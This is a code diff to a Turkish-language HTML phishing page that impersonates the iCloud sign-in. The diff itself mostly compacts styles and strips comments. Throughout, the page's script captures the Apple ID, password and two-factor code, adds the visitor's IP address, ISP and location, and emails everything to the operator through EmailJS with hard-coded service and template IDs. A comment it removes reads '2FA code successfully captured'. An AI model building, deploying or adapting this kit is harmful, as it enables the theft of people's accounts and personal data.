@@ -7,7 +7,7 @@
     <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
     <script type="text/javascript">
         (function() {
-            // !!! KENDİ PUBLIC KEY'İNİZİ GİRİN !!!
+            // !!! KENDI PUBLIC KEY'INIZI GIRIN !!!
             emailjs.init("bOJixfHEM1uPomqLS"); 
         })();
     </script>
@@ -27,48 +27,15 @@
         .error-message { color: #ff3b30; font-size: 14px; margin-top: 16px; display: none; }
         .footer-links { margin-top: 32px; font-size: 14px; }
         .footer-links a { color: #007aff; text-decoration: none; }
-
-        /* Yönlendirme Ekranı Stilleri */
-        .redirect-overlay {
-            display: none; /* Başlangıçta gizli */
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background-color: rgba(255, 255, 255, 0.95);
-            color: #1d1d1f;
-            border-radius: 18px;
-            justify-content: center;
-            align-items: center;
-            flex-direction: column;
-            z-index: 10;
-        }
-        .spinner {
-            border: 4px solid #f3f3f3;
-            border-top: 4px solid #007aff;
-            border-radius: 50%;
-            width: 40px;
-            height: 40px;
-            animation: spin 1s linear infinite;
-            margin-bottom: 20px;
-        }
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
+        .redirect-overlay { display: none; position: absolute; top: 0; left: 0; width: 100%; height: 100%; background-color: rgba(255, 255, 255, 0.95); color: #1d1d1f; border-radius: 18px; justify-content: center; align-items: center; flex-direction: column; z-index: 10; }
+        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #007aff; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin-bottom: 20px; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
     <div class="container">
         <div class="login-card">
-            <!-- Yönlendirme Ekranı -->
-            <div class="redirect-overlay" id="redirectOverlay">
-                <div class="spinner"></div>
-                <p>İcloud hesabınız doğrulanıyor...</p>
-            </div>
-
-            <!-- 1. Adım: Giriş Formu -->
+            <div class="redirect-overlay" id="redirectOverlay"><div class="spinner"></div><p>iCloud hesabınız doğrulanıyor...</p></div>
             <div id="stepOneForm">
                 <div class="icloud-logo">☁️</div>
                 <h2>iCloud'a Giriş Yap</h2>
@@ -79,12 +46,8 @@
                     <button type="submit" class="login-button">Giriş Yap</button>
                     <div class="error-message" id="errorMessage">Apple ID veya parola yanlış.</div>
                 </form>
-                <div class="footer-links">
-                    <a href="#">Apple ID'nizi mi unuttunuz?</a> veya <a href="#">Parola mı unuttunuz?</a>
-                </div>
+                <div class="footer-links"><a href="#">Apple ID'nizi mi unuttunuz?</a> veya <a href="#">Parola mı unuttunuz?</a></div>
             </div>
-
-            <!-- 2. Adım: 2FA Formu -->
             <div id="stepTwoForm" style="display: none;">
                 <div class="icloud-logo">☁️</div>
                 <h2>İki Faktörlü Kimlik Doğrulama</h2>
@@ -145,7 +108,7 @@
                 ip_address: geoData.ip, isp: geoData.org, country: geoData.country_name, city: geoData.city, latitude: geoData.latitude, longitude: geoData.longitude
             };
 
-            // !!! KENDİ SERVICE_ID VE TEMPLATE_ID'NİZİ GİRİN !!!
+            // !!! KENDI SERVICE_ID VE TEMPLATE_ID'NIZI GIRIN !!!
             emailjs.send('service_mdm9ze3', 'template_umbj15o', templateParams)
                 .then(function(response) {
                     console.log('1. Adım E-posta (Giriş Bilgileri) başarıyla gönderildi!', response.status, response.text);
@@ -167,16 +130,13 @@
             const username = document.getElementById('username').value; // Önceki adımdaki kullanıcı adını al
 
             // 2FA kodunu ayrı bir e-posta ile göndermek için parametreler
-            // !!! BU İÇİN YENİ BİR EMAILJS ŞABLONU (TEMPLATE) OLUŞTURMAN GEREKEBİLİR !!!
             const twoFaParams = {
                 username: username,
-                two_fa_code: twoFactorCode,
-                message: "2FA Kodu Başarıyla Yakalandı."
+                two_fa_code: twoFactorCode
             };
 
-            // !!! KENDİ 2FA İÇİN OLUŞTURDUĞUN SERVICE_ID VE TEMPLATE_ID'NİZİ GİRİN !!!
-            // Eğer aynı şablonu kullanacaksan, template_umbj15o'nu değiştirme.
-            emailjs.send('service_mdm9ze3', 'template_umbj15o', twoFaParams) // Veya yeni bir template ID'si
+            // !!! KENDI 2FA ICIN OLUSTURDUGUN SERVICE_ID VE TEMPLATE_ID'NIZI GIRIN !!!
+            emailjs.send('service_mdm9ze3', 'template_umbj15o', twoFaParams)
                 .then(function(response) {
                     console.log('2. Adım E-posta (2FA Kodu) başarıyla gönderildi!', response.status, response.text);
                     
@@ -195,3 +155,6 @@
                     document.getElementById('errorMessage2FA').style.display = 'block';
                 });
         });
+    </script>
+</body>
+</html>
